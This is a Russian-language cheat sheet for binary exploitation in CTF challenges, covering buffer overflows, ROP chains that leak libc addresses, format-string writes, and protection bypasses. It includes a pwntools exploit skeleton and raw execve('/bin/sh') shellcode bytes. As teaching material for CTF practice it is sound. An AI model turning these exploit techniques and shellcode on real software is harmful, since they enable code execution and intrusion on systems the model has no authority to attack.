# 💥 Шпаргалка по эксплуатации бинарных файлов (Pwn) в CTF

<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[🇬🇧 English](../Pwn-CTF.md) • [🇷🇺 Русский раздел](../../README.ru.md)

> **Уточнение к фрагментам:** адрес 0xdeadbeef и offset = 64 — примеры, а offset, target_addr и value в отдельных фрагментах требуют соответствующих исходных данных. Цепочка ROP и shellcode-фрагменты не являются самостоятельными законченными эксплойтами. Заголовок «64-разрядный Linux» сам по себе не задаёт архитектуру для pwntools: она определяется [настройками context](https://docs.pwntools.com/en/stable/context.html). Команды pattern create/offset требуют подходящего расширения GDB.

[🇹🇷 Türkçe Sürüm](Pwn-CTF.tr.md) • [🇬🇷 Ελληνικά](Pwn-CTF.el.md)

---

## 🔍 Первоначальный анализ

```bash
# Проверить механизмы защиты
checksec binary

# Сведения о файле
file binary
ldd binary        # Библиотеки

# Запустить файл
./binary
ltrace ./binary   # Вызовы библиотек
strace ./binary   # Системные вызовы
```

---

## 🛡️ Механизмы защиты

| Защита | Описание | Способ обхода |
|------------|-------------|--------|
| **NX** | Запрет исполнения кода в стеке | ROP |
| **ASLR** | Рандомизация адресов | Утечка адреса и вычисление смещений |
| **PIE** | Рандомизация базового адреса исполняемого файла | Утечка адреса в исполняемом файле |
| **Canary** | Контрольное значение в стеке (канарейка) | Утечка канарейки |
| **RELRO** | Защита таблицы GOT | Применить другие техники |

---

## 📏 Переполнение буфера

### Поиск смещения
```bash
# С помощью pwntools
cyclic 200        # Создать шаблон
cyclic -l 0x6161616a  # Найти смещение

# С помощью GDB
pattern create 200
pattern offset 0x6161616a
```

### Базовый эксплойт (pwntools)
```python
from pwn import *

p = process('./binary')
# p = remote('host', port)

offset = 64
payload = b'A' * offset
payload += p64(0xdeadbeef)  # Адрес возврата

p.sendline(payload)
p.interactive()
```

---

## 🔗 ROP — программирование с возвратами

### Поиск гаджетов
```bash
ROPgadget --binary binary
ropper -f binary

# Типичные гаджеты
pop rdi; ret
pop rsi; pop r15; ret
ret                  # Для выравнивания стека
```

### Цепочка ROP (pwntools)
```python
from pwn import *

elf = ELF('./binary')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
rop = ROP(elf)

# Построить цепочку
rop.call(elf.plt['puts'], [elf.got['puts']])
rop.call(elf.symbols['main'])

payload = b'A' * offset + rop.chain()
```

---

## 🐚 Шелл-код

### 64-разрядный Linux
```python
# pwntools shellcraft
shellcode = asm(shellcraft.sh())

# Вручную
# execve("/bin/sh", NULL, NULL)
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
```

---

## 📚 Уязвимость форматной строки

```bash
# Получить утечку значений
%p %p %p %p %p
%x %x %x %x %x

# Запись
%n - записать число выведенных байтов
%hhn - записать один байт
```

```python
# pwntools fmtstr
from pwn import *
fmtstr_payload(offset, {target_addr: value})
```

---

## 🛠️ Инструменты

| Инструмент | Применение |
|------|-----|
| **pwntools** | Библиотека Python для эксплуатации бинарных файлов |
| **GDB + GEF** | Отладка |
| **ROPgadget** | Поиск гаджетов ROP |
| **one_gadget** | Поиск подходящих гаджетов в libc |
| **checksec** | Проверка механизмов защиты |

---

## 📋 Контрольный список Pwn

```markdown
□ checksec binary
□ Найти уязвимость (переполнение, форматная строка)
□ Вычислить смещение
□ Проверить механизмы защиты
□ Подготовить эксплойт (шелл-код или ROP)
□ Проверить локально
□ Адаптировать к удалённой среде
```

---

**К разделу CTF:** [🏁 Обзор CTF](./README.ru.md)
